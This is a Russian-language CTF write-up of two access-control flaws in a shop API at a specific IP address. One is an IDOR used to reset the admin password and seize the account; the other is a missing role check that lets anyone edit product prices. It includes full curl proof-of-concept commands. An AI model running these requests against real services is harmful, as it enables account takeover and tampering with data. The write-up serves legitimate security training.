# Writeup

## Вектор 1 — IDOR / Broken Access Control on user profile endpoints

### Шаг 1 - Сбор информации

При анализе backend API установлено, что профиль пользователя доступен по адресу `/api/users/<email>`. Эндпоинт принимает адрес электронной почты в URL и возвращает данные соответствующего пользователя.

Проверочный запрос к профилю администратора:

```bash
curl "http://82.202.142.35:8080/api/users/admin%40example.com"
```

Ответ сервера подтверждает существование учётной записи `admin@example.com` и показывает, что backend принимает пользовательский идентификатор напрямую из URL.

### Шаг 2 - Подтверждение IDOR

Дальнейший анализ показал, что backend использует значение `email`, переданное в URL, как прямой идентификатор объекта пользователя. При этом серверная часть не проверяет, имеет ли текущий пользователь право просматривать или изменять профиль, относящийся к другой учётной записи.

Таким образом, реализована уязвимость класса Insecure Direct Object Reference: объект выбирается по контролируемому клиентом идентификатору, а object-level authorization отсутствует.

### Шаг 3 - Смена пароля целевого пользователя

После подтверждения доступа к чужому пользовательскому объекту выполняется запрос на изменение профиля администратора через endpoint `/api/users/admin@example.com`.

Этот endpoint позволяет передать новое значение поля `password` без запроса текущего пароля, повторной аутентификации или отдельной проверки привилегий. В результате пароль учётной записи `admin@example.com` может быть заменён на произвольный.

```bash
curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Алексей Смирнов",
    "email":"admin@example.com",
    "password":"newpass123",
    "notifications":true,
    "shipping_address":"Moscow, Test street 1"
  }'
```

### Шаг 4 - Подтверждение успешного захвата аккаунта

После изменения пароля выполняется обычная авторизация через endpoint `/api/auth/login` с использованием нового значения пароля.

Успешная аутентификация подтверждает, что управление учётной записью администратора полностью перехвачено и атакующий получил доступ к функциям и данным, доступным владельцу целевого аккаунта.

```bash
curl -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"admin@example.com",
    "password":"newpass123"
  }'
```

### Шаг 5 - Получение флага

После входа под учётной записью `admin@example.com` извлекается содержимое поля `shipping_address`, в котором размещён флаг формата `ctf{...}`.

```bash
curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"admin@example.com",
    "password":"newpass123"
  }' | jq -r '.shipping_address'
```

### Шаг 6 - Реализация критического события

Результатом эксплуатации уязвимости является несанкционированный доступ к персональным данным VIP-клиента и полный захват административной учётной записи.

Атакующий получает возможность:
- просматривать и изменять персональные данные пользователя;
- подменять пароль и блокировать владельцу доступ к аккаунту;
- использовать скомпрометированную учётную запись для дальнейших действий в системе;
- извлекать конфиденциальные сведения, включая данные доставки и настройки профиля.

### Техническая причина

Причиной уязвимости является отсутствие серверной проверки прав доступа к объекту пользователя при работе с endpoint вида `/api/users/<email>`. Backend доверяет идентификатору, переданному клиентом, и не сопоставляет его с аутентифицированной сессией.

Дополнительно механизм изменения профиля допускает обновление чувствительного поля `password` через общий endpoint редактирования пользовательских данных, не требуя ввода текущего пароля, повторной аутентификации или отдельной проверки привилегий.

Комбинация этих ошибок приводит к возможности захвата чужой учётной записи с последующим доступом к её данным.

### Воздействие

Уязвимость может привести к следующим последствиям:
- компрометация учётных записей пользователей;
- утечка персональных и контактных данных клиентов;
- несанкционированное изменение настроек профиля;
- потеря владельцем контроля над своей учётной записью;
- использование захваченного аккаунта для дальнейшего развития атаки.

### POC

```bash
# Проверка существования пользователя
curl "http://82.202.142.35:8080/api/users/admin%40example.com"

# Смена пароля
curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Алексей Смирнов",
    "email":"admin@example.com",
    "password":"newpass123",
    "notifications":true,
    "shipping_address":"Moscow, Test street 1"
  }'

# Авторизация под новым паролем
curl -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"admin@example.com",
    "password":"newpass123"
  }'

# Получение первого флага
curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"admin@example.com",
    "password":"newpass123"
  }' | jq -r '.shipping_address'
```

## Вектор 2 — Broken Access Control on product management endpoints

### Шаг 1 - Сбор информации

При анализе API каталога установлено, что карточки товаров доступны через endpoint `/api/products/<id>`. Запрос к товару `yacht-001` возвращает полную структуру объекта, включая название, тип, цену, изображение и описание.

```bash
curl "http://82.202.142.35:8080/api/products/yacht-001"
```

Полученный ответ позволяет определить формат объекта товара и подготовить корректный запрос на его изменение.

### Шаг 2 - Анализ логики управления товарами

При исследовании логики работы приложения установлено, что разграничение доступа к функциям управления каталогом реализовано преимущественно на стороне frontend-интерфейса. Элементы административного управления скрываются в пользовательском интерфейсе, однако backend API не выполняет обязательную серверную проверку роли при обращении к методам изменения карточек товаров.

В результате endpoint редактирования товара остаётся доступным напрямую, и любой внешний клиент, способный отправить HTTP-запрос, может изменить параметры существующего товара.

### Шаг 3 - Несанкционированное изменение карточки товара

Используя endpoint `PUT /api/products/yacht-001`, атакующий отправляет обновлённый JSON-объект товара и изменяет содержимое карточки без административного доступа.

Запрос позволяет подменить критически важные поля, включая цену и описание.

```bash
curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
  -H "Content-Type: application/json" \
  -d '{
    "title":"Azimut 77 Yacht",
    "type":"Yacht",
    "price":1,
    "image":"images/yachts/yacht-001.jpg",
    "description":"ctf{PLACEHOLDER_FLAG}"
  }'
```

### Шаг 4 - Подтверждение результата

После выполнения запроса на изменение карточки товара выполняется повторное чтение объекта `yacht-001`.

Повторный запрос подтверждает, что изменения сохранены сервером и опубликованы в каталоге без проверки роли администратора или дополнительного механизма авторизации.

```bash
curl "http://82.202.142.35:8080/api/products/yacht-001"
```

### Шаг 5 - Получение флага

Флаг извлекается из поля `description` карточки товара `yacht-001` после успешного изменения и повторного чтения объекта товара.

```bash
curl -s "http://82.202.142.35:8080/api/products/yacht-001" | jq -r '.description'
```

### Шаг 6 - Реализация критического события

Эксплуатация уязвимости приводит к несанкционированному изменению товарной витрины luxury-магазина.

Атакующий получает возможность:
- изменять описание и визуальное содержимое карточек товаров;
- подменять стоимость лотов;
- размещать недостоверную информацию в каталоге;
- нарушать целостность витрины и вводить клиентов в заблуждение;
- наносить репутационный и финансовый ущерб владельцу платформы.

### Техническая причина

Причиной уязвимости является отсутствие server-side authorization на endpoint управления товарами. Backend принимает запросы на изменение карточек товара без проверки роли пользователя и без подтверждения того, что вызывающая сторона обладает правами контент-менеджера или администратора.

Фактически контроль доступа реализован только на уровне интерфейса, что не обеспечивает защиту API от прямых запросов. Такой подход позволяет обойти frontend-ограничения и выполнять операции изменения данных напрямую через HTTP-запросы.

### Воздействие

Уязвимость может привести к следующим последствиям:
- несанкционированное изменение публичного каталога;
- подмена цен и описаний дорогостоящих товаров;
- компрометация целостности бизнес-данных;
- введение клиентов в заблуждение;
- репутационные и финансовые потери компании.

### POC

```bash
# Просмотр карточки товара
curl "http://82.202.142.35:8080/api/products/yacht-001"

# Изменение карточки товара без admin-доступа
curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
  -H "Content-Type: application/json" \
  -d '{
    "title":"Azimut 77 Yacht",
    "type":"Yacht",
    "price":1,
    "image":"images/yachts/yacht-001.jpg",
    "description":"ctf{PLACEHOLDER_FLAG}"
  }'

# Проверка изменения
curl "http://82.202.142.35:8080/api/products/yacht-001"

# Получение второго флага
curl -s "http://82.202.142.35:8080/api/products/yacht-001" | jq -r '.description'
```
